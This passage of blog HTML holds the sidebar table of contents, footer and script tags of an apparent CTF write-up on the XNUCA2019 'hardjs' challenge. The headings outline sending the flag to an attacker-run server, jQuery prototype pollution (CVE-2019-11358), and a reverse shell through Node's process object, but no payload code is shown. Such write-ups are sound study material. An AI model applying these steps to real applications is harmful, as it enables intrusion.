href="#因为首页会自动加载我们保存的html数据，所以这个时候我的思路是可以构造一个form，但是提交地址是自己的服务器，这样就可以接受到来自bot的flag了。"><span class="nav-number">1.0.6.2.</span> <span class="nav-text">因为首页会自动加载我们保存的html数据，所以这个时候我的思路是可以构造一个form，但是提交地址是自己的服务器，这样就可以接受到来自bot的flag了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#再加上robot-py中的以下细节，我认为从前端下手应该是出题人预留的预期解之一。"><span class="nav-number">1.0.6.3.</span> <span class="nav-text">再加上robot.py中的以下细节，我认为从前端下手应该是出题人预留的预期解之一。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#所以审计前端的app-js"><span class="nav-number">1.0.6.4.</span> <span class="nav-text">所以审计前端的app.js</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#发现所有我们保存在数据库的数据是动态加载到一个有sanbox标签的iframe中，这就导致即使我们可以写一个表单，也无法被提交，我们的数据中的js是不会被执行的。"><span class="nav-number">1.0.6.5.</span> <span class="nav-text">发现所有我们保存在数据库的数据是动态加载到一个有sanbox标签的iframe中，这就导致即使我们可以写一个表单，也无法被提交，我们的数据中的js是不会被执行的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#不过恰巧的是app-js使用的Jquery前段时间也有一个原型链污染漏洞被曝出，而且在页面中也使用到了"><span class="nav-number">1.0.6.6.</span> <span class="nav-text">不过恰巧的是app.js使用的Jquery前段时间也有一个原型链污染漏洞被曝出，而且在页面中也使用到了</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#具体的CVE号是CVE-2019-11358，利用方法类似上文的漏洞。"><span class="nav-number">1.0.6.7.</span> <span class="nav-text">具体的CVE号是CVE-2019-11358，利用方法类似上文的漏洞。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#官方的payload参考如下："><span class="nav-number">1.0.6.8.</span> <span class="nav-text">官方的payload参考如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-github-com-NeSE-Team-OurChallenges-tree-master-XNUCA2019Qualifier-Web-hardjs"><span class="nav-number">1.0.6.9.</span> <span class="nav-text">https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#挖掘后端攻击方法"><span class="nav-number">1.0.7.</span> <span class="nav-text">挖掘后端攻击方法</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#请看前文的介绍。"><span class="nav-number">1.0.7.1.</span> <span class="nav-text">请看前文的介绍。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#成功攻击"><span class="nav-number">1.0.8.</span> <span class="nav-text">成功攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#可以发现process是可以访问到的，所以我们可以用来反弹shell"><span class="nav-number">1.0.8.1.</span> <span class="nav-text">可以发现process是可以访问到的，所以我们可以用来反弹shell</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最后的payload如下"><span class="nav-number">1.0.8.2.</span> <span class="nav-text">最后的payload如下</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#发送5次请求，然后访问-get进行原型链污染，最后访问-或-login触发render函数，成功反弹shell并getflag"><span class="nav-number">1.0.8.3.</span> <span class="nav-text">发送5次请求，然后访问/get进行原型链污染，最后访问/或/login触发render函数，成功反弹shell并getflag</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#总结："><span class="nav-number">1.0.9.</span> <span class="nav-text">总结：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#通过在这次复现中又学到了很多的东西，感谢各位师傅了。"><span class="nav-number">1.0.9.1.</span> <span class="nav-text">通过在这次复现中又学到了很多的东西，感谢各位师傅了。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考链接"><span class="nav-number">1.0.10.</span> <span class="nav-text">参考链接</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-expressjs-com-en-api-html-res-cookie"><span class="nav-number">1.0.10.1.</span> <span class="nav-text">https://expressjs.com/en/api.html#res.cookie</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-cnodejs-org-topic-55f8d70a20d84f3d377582a3"><span class="nav-number">1.0.10.2.</span> <span class="nav-text">https://cnodejs.org/topic/55f8d70a20d84f3d377582a3</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-juejin-im-post-5a24fd8f51882509e5438247"><span class="nav-number">1.0.10.3.</span> <span class="nav-text">https://juejin.im/post/5a24fd8f51882509e5438247</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-www-jianshu-com-p-9c952600a741"><span class="nav-number">1.0.10.4.</span> <span class="nav-text">https://www.jianshu.com/p/9c952600a741</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-cnodejs-org-topic-5757e80a8316c7cb1ad35bab"><span class="nav-number">1.0.10.5.</span> <span class="nav-text">https://cnodejs.org/topic/5757e80a8316c7cb1ad35bab</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-xz-aliyun-com-t-6113-toc-5"><span class="nav-number">1.0.10.6.</span> <span class="nav-text">https://xz.aliyun.com/t/6113#toc-5</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-xz-aliyun-com-t-6101-toc-1"><span class="nav-number">1.0.10.7.</span> <span class="nav-text">https://xz.aliyun.com/t/6101#toc-1</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ljdd520</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">86.2k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
